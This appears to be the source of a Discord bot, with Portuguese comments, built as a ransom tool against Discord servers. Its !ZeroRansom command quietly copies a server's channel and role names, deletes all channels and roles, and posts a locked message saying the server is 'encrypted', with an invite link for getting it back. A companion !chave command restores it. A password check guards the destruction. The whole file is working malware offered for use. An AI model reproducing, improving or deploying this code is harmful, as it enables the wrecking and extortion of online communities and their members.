import discord
from discord.ext import commands
import json

intents = discord.Intents.default()
intents.members = True  # Para acessar informações dos membros
client = commands.Bot(command_prefix="!", intents=intents)
client.remove_command("help")

# Dicionário para armazenar backups
backups = {}
password_verified = False  # Variável para verificar o estado da senha

@client.event
async def on_ready():
    print("Ready!")

async def check_password(ctx):
    """Verifica a senha antes de executar o comando."""
    global password_verified
    if not password_verified:
        await ctx.send("Por favor, insira a senha para continuar:")
        try:
            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel

            msg = await client.wait_for('message', check=check, timeout=30)
            if msg.content == "1337":
                password_verified = True
                await ctx.send("Senha correta! Você pode usar os comandos agora.")
            else:
                await ctx.send("Senha incorreta. Você não pode usar os comandos.")
                return False
        except asyncio.TimeoutError:
            await ctx.send("Tempo esgotado. Você não inseriu a senha a tempo.")
            return False
    return True

@client.command()
async def list_guilds(ctx):
    """Lista todos os servidores em que o bot está, junto com seus IDs."""
    guilds = client.guilds
    if not guilds:
        await ctx.send("O bot não está em nenhum servidor.")
        return

    guild_list = [f"{guild.name} (ID: {guild.id})" for guild in guilds]
    await ctx.send("\n".join(guild_list))

@client.command()
async def members(ctx, guild_id: int):
    """Mostra o número de membros em um servidor específico."""
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Servidor não encontrado.")
        return
    
    member_count = guild.member_count
    await ctx.send(f"O servidor tem {member_count} membros.")

@client.command()
async def ZeroRansom(ctx, guild_id: int):
    if not await check_password(ctx):
        return
    
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Servidor não encontrado.")
        return

    await ctx.send("**Iniciando o backup do servidor...**")

    # Criar backup dos canais e cargos
    backup_data = {
        "channels": [],
        "roles": [],
        "members": [member.name for member in guild.members]
    }

    for channel in guild.channels:
        backup_data["channels"].append({"name": channel.name, "type": str(channel.type)})

    for role in guild.roles:
        if role.name != "@everyone":
            backup_data["roles"].append(role.name)

    # Salvar o backup no dicionário
    backups[guild.id] = backup_data

    # Deletar todos os canais e cargos
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Erro ao deletar canal {channel.name}: {e}")

    for role in guild.roles:
        try:
            if role.name != "@everyone":  # Não delete a role padrão
                await role.delete()
        except Exception as e:
            print(f"Erro ao deletar cargo {role.name}: {e}")

    # Criar canal ZeroRansom
    channel = await guild.create_text_channel("ZeroRansom")

    # Definir permissões do canal para que ninguém possa escrever
    await channel.set_permissions(guild.default_role, send_messages=False)

    # Enviar mensagem no canal
    await channel.send("Seu servidor foi criptografado kkkk se quiser ele de volta venha aqui -> https://discord.gg/Ct2n6xRk9h")

@client.command()
async def chave(ctx, guild_id: int):
    if guild_id not in backups:
        await ctx.send("Backup não encontrado para este servidor.")
        return

    # Recuperar dados do backup
    backup_data = backups[guild_id]
    guild = client.get_guild(guild_id)

    # Excluir todos os canais ZeroRansom, se existirem
    channels_to_delete = [channel for channel in guild.channels if channel.name == "ZeroRansom"]
    for channel in channels_to_delete:
        await channel.delete()
    
    # Restaurar canais e cargos
    for role_name in backup_data["roles"]:
        await guild.create_role(name=role_name)

    for channel_info in backup_data["channels"]:
        if channel_info["type"] == "text":
            await guild.create_text_channel(name=channel_info["name"])
        elif channel_info["type"] == "voice":
            await guild.create_voice_channel(name=channel_info["name"])

    await ctx.send("Servidor restaurado com sucesso!")

@client.command()
async def list_commands(ctx):
    """Lista todos os comandos disponíveis."""
    commands_list = [
        "!help - `(Mostra os comandos disponíveis)`",
        "!list_guilds - `(Lista todos os servidores que o bot está)`",
        "!members [guild_id] - `(Mostra o número de membros no servidor)`",
        "!ZeroRansom [guild_id] - `(Faz backup, deleta tudo e cria um canal ZeroRansom)`",
        "!chave [guild_id] - `(Restaura o servidor a partir do backup)`",
        "!f - `(Sai do Bot)`"
    ]
    await ctx.send("\n".join(commands_list))

@client.command()
async def help(ctx):
    await ctx.send("Use `!list_commands` para ver todos os comandos disponíveis.")

@client.command()
async def f(ctx):
    await ctx.send("Exiting...")
    await client.close()

TOKEN = ""
client.run(TOKEN)
